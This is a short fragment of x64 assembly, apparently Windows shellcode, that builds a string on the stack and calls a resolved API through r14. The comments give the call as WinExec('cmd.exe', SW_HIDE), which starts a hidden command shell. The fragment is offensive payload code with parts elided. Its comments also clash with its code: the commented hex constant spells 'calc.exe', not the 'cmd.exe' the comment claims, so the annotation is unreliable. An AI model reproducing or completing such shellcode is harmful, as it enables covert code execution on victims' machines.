...
mov rax, qword [rel cmd]

							; mov rax, 0x6578652e636c6163 ; exe.dmc : 6578652e636c6163
push rax                    ; RSP = "cmd.exe",0x0
mov rcx, rsp                ; RCX = "cmd.exe",0x0
...
call r14                    ; Call WinExec("cmd.exe", SW_HIDE)
